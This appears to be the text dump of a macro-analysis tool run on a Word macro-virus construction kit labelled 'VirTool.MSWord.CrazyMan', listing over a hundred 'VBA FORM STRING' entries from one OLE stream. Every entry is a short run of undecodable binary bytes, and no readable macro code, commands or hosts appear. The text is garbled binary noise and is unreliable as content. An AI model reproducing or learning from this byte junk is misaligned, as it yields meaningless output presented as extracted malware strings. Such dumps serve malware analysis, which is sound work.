VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.���.����*�\������v��e؜
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@�z�O��Z�j��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�����p��#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:a�*)�k`Kk�h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SEf2��:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ii�j����d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���v���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q��!���j��d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w��i-�#I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9���I��X6?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wo��O s�޶
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ؑ�JU����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_�5��"1�1�lH�o�u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'��vJ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���)6���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��A<��:�'k+ɑ��4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8;��:�Y,��!~�9ߝ/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t_д��H���r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V坍!Э�P�ۂ6�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�b��.Rv=%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��jo$rp#�v��ޛ�YC �rf=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ho�f�&��+(9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���n9'%�0x�\�ү
(
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����+Yͱ����5�f�..mgi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\~�5�	�c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k>���b���J9S���6��j~����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I卤hʏ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@���YYE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9<؎��z��a�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.W����?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H>�q���*.����	��U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~�S0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~�O�e-
�]�V��
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W��<+e!a�
r3^q��-��m;�*�	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�^�$�h��*G:���k��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L�U�̩а
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`y
�j��MU�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c5��V���`�i��ş.���g,�`M_�F�I�L�#g�'a��©
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W��F���O}K�6�T��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�QB��үn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�z=E���K��g
����<7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�q�SBf���B���2�j�ui��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.`�����I�3H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ԉ�<_��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5skhlm"��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i���V0��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V�9N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'��9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w���V�󨧶B���ʺ���0�_���ǋ_{s�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǻ�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d-f'�Lq���J��:�Zu��6	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

���AO��N1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[0���\�r(ۏ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ػ�7694W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$Dݻ>V�C�$���o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;#gq�+?]F�2+g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5L�d��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i㸌�0�>�)�f.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� ���p�1�,[+�4�H��;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x��X�Yg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�Tb�K-I7y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pj�G�Ȅ�*�`ı��6�C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���-uwl�����Q�f���wj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Xdd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W�wסq�SL�>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�E�0�i�,�װ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k7�,r�S��ԟCA���� Q����Jm�֋J�#�����}�U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J瑯����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'sXKf
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H��L�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O���5K�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�ѳ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z�i�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��pT��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H��s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ف-�-��Z5%��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S�3˞iF��$�qg =�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a��~���.�Ș
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ұ(I�<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\�`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�a!Ē�f��R��)��5�ˁ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ُ]�T������!������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-�bou
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o-��w'�B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�et��|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i�3q|�m��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�jK����p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ַ��Ϊ�}�r�S�r�n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�yV:��7-q����S�� �G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x37�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QE8PQE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6��ЇQ1��aÿ�O�֓�pI�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6��Y�T�GS�f����9�5V��h� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~<�e�H�Gh��1��W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'���^Nӓo	�>Y�Ƭ�ˤ\�I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
min�l�T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V803�Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$��e���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��CV-o{�(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<0D��v3�jY�B�AA��ռ����q�!��8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c����O�g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���5��<�!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{�Gh�/���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*��~��P������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��� N¹����(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(�v�:]i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���b�I��\��T�X�5�ү}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���lt�4�VYG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j<��O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[��U�F7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R?�q�0�2[��SOH@v#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,�N��2��Kx� M���i�xI�r:��~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
84�V�B#/�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h���Gg$S�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
»�9,+;��}Vr:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+S+�*:u>U���Ggc�c�|�[�;r!�$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(��$
(��
(��
(��
�kx��[-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��«Q\j��M�ƫI�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���mXx�x��
